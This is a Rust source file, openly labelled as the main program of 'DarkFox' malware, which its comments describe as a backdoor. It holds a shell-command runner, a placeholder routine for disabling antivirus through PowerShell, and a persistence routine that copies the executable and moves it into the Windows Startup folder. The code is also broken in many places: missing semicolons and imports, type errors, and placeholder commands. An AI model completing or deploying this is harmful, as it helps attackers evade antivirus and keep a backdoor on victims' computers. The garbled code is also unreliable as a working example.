/*
 * This is the main program for the DarkFox m4lw4r3
 *
 * It releases several custom payloads which can be configured.
 *
 * The main malware just acts as a backdoor untill activated to yazzz
 *
 * written by laelaps as a gift for someone special
 */

 // Imports

 use std::fs;

// Configuration

const SELF_FILENAME: &str = "darkfox.exe"

const TRY_AV_DEACTIVATION: bool = true;
const INSTALL_PERSISTANCE: bool = true

let reboot_dir: String;

// Methods

 fn exec_cmd(command: &str) -> String {
     let cmd_exec = if cfg!(target_os = "windows") {
         Command::new("cmd")
             .args(["/C", command])
             .output()
             .expect("failed")
     } else {
         Command::new("sh")
             .arg("-c")
             .arg(command)
             .output()
             .expect("failed")
     };
     let output_vec = cmd_exec.stdout;
     let output: String = match String::from_utf8(output_vec) {
         Ok(v) => v,
         Err(e) => String::from("[*] ~ Error during conversion of output to string"),
     };
     return output
 }

fn try_av_deactivation() -> bool {
    let output: String = exec_cmd("PowerShell.exe -command ") // edit with real command for exception
    if output == "success string" { // edit here for success string
        return true
    } else {
        return false
    }
}

fn get_dirs() {
    let homedir: String = exec_cmd("echo %HOMEPATH%")
    reboot_dir = format!("C:{}\\AppData\\Roaming\\Microsoft\\Windows\\Startup Folder\\Programs\\Startup", homedir); //chech this
}

fn install_persistance() -> bool {
    let success: bool = match fs::copy(SELF_FILENAME, "persistance.exe") {
        Ok(v) => true,
        Err(_) => false,
    };
    if success != true {
        let to_exec_str: String = format!("copy {} persistance.exe", SELF_FILENAME);
        exec_cmd(to_exec_str)
    }
    let move_cmd_str: String = format!("move {} {}", SELF_FILENAME, reboot_dir);
    exec_cmd(move_cmd_str)
}

fn main() {

    if TRY_AV_DEACTIVATION {
        let success: bool = try_av_deactivation();
    }

    if INSTALL_PERSISTANCE {
        let success: bool = install_persistance();
    }


    // pass

}
